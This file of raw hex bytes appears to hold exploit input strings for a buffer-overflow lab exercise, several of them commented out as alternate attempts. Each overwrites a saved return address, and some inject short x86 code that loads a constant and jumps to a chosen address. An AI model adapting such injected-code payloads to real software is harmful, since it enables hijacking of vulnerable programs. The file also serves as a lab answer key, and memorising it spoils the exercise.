/*
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 d8 2f 68 55
*/


/*
bd 00 30 68 55 bc c8 2f 
68 55 b8 02 e9 dc 74 68 
ae 90 04 08 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 d8 2f 68 55
*/

/*
00 00 00 00 bc 04 30 68 
55 bd 30 30 68 55 c7 05 
04 30 68 55 d6 be c0 65 
68 55 b8 02 e9 dc 74 c7
05 08 30 68 55 c0 65 68
55 c3 00 00 dc 2f 68 55
*/


b8 02 e9 dc 74 bd 30 30
68 55 68 d6 8c 04 08 c3
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 d8 2f 68 55

/*
89 e0 bd 30 30 68 55 68 
d6 8c 04 08 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 d8 2f 68 55
*/